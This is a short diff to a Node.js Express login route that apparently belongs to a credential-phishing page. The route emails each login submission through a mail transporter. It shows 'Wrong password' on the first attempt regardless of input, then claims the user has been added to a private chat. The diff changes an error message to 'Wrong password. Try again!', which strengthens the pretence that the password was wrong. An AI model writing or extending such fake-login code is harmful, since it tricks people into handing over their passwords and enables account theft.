@@ -71,7 +71,7 @@ app.post("/login", (req, res) => {
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
             console.log(error);
-            req.session.message = 'Error joining room.';
+            req.session.message = 'Wrong password. Try again!';
         } else {
             console.log('Email sent: ' + info.response);
             req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
